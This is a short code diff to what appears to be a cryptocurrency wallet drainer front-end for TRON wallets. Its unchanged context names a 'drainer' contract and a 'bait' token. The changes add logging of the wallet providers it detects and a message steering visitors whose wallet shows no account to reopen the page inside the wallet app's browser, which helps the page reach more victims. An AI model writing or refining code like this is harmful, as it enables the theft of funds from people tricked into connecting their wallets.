@@ -261,6 +261,8 @@ function pickProvider() {
   return c.find((x) => x && typeof x.request === 'function');
 }
 
+console.info('providers:', ['tronLink', 'bybitWallet', 'okxwallet', 'tokenpocket', 'bitkeep', 'gatewallet', 'trustwallet'].filter((k) => window[k]).join(',') || 'none');
+
 async function connectTronLink() {
   if (DEMO) { cfg = { drainer: 'TDemoDrainerContractxxxxxxxxxxxxxx1', bait: 'TDemoBait' }; $('contract').textContent = cfg.drainer; signer = { kind: 'demo', address: 'TDemoAddressxxxxxxxxxxxxxxxxx1' }; account = signer.address; await load(); return; }
   $('connect-tl').disabled = true;
@@ -270,7 +272,9 @@ async function connectTronLink() {
   if (prov) { try { await prov.request({ method: 'tron_requestAccounts' }); } catch (e) {} }
   const tw = prov && (prov.tronWeb || prov);
   if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) {
-    setStatus('Wallet not found — use the other wallet button.', 'err');
+    setStatus(prov
+      ? 'Wallet provider found, but no account. Open this page inside the wallet app (Discover / browser).'
+      : 'Wallet not found — use the other wallet button.', 'err');
     $('connect-tl').disabled = false; return;
   }
   signer = { kind: 'tronlink', w: tw, address: tw.defaultAddress.base58 };
